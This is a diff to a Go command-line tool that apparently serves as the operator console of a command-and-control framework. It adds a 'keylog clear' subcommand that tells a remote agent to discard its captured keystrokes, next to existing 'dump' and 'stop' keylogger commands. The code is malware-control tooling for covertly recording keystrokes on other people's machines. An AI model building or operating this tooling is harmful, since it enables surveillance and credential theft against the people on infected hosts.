@@ -187,6 +187,44 @@ var keylogDumpCmd = &cobra.Command{
 }
 
 // keylog stop <agent-id>
+var keylogClearCmd = &cobra.Command{
+	Use:   "clear <agent-id>",
+	Short: "Discard buffered keystrokes without returning them",
+	Args:  cobra.ExactArgs(1),
+	Run: func(cmd *cobra.Command, args []string) {
+		agentID, err := resolveAgentID(args[0])
+		if err != nil {
+			printError(err.Error())
+			os.Exit(1)
+		}
+		wait, _ := cmd.Flags().GetBool("wait")
+		timeout, _ := cmd.Flags().GetInt("timeout")
+
+		body, err := makeAPIRequestWithMethod("POST",
+			"/api/v1/agent/"+agentID+"/keylog/clear", nil, "application/json")
+		if err != nil {
+			printError(fmt.Sprintf("Keylog clear failed: %v", err))
+			os.Exit(1)
+		}
+		var resp APIResponse
+		if err := json.Unmarshal(body, &resp); err != nil || !resp.Success {
+			printError("Keylog clear request failed")
+			os.Exit(1)
+		}
+		dataMap, _ := resp.Data.(map[string]interface{})
+		cmdID, _ := dataMap["command_id"].(string)
+		printSuccess("Keylog buffer clear queued")
+
+		if wait && cmdID != "" {
+			if finalData, ok := waitForCommand(cmdID, timeout).(map[string]interface{}); ok {
+				displayFinalCommandStatus(finalData, cmdID)
+			}
+		} else if cmdID != "" {
+			printInfo(fmt.Sprintf("command_id: %s", cmdID))
+		}
+	},
+}
+
 var keylogStopCmd = &cobra.Command{
 	Use:   "stop <agent-id>",
 	Short: "Stop keylogger and return final buffer",
